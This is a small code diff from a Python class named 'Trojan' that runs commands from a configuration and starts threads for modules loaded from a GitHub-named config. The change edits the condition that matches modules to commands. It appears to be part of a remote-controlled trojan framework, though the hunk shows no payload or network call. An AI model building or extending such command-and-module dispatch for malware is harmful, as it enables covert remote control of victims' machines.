@@ -97,7 +97,7 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
                     for module in github_config.get('modules', []):
-                        if module['enabled'] and module['conditions'].get('execute_on_command') == command:
+                        if module['enabled'] and module['module'] == command:
                             thread = threading.Thread(target=self.module_runner, args=(module['module'],))
                             thread.start()
 
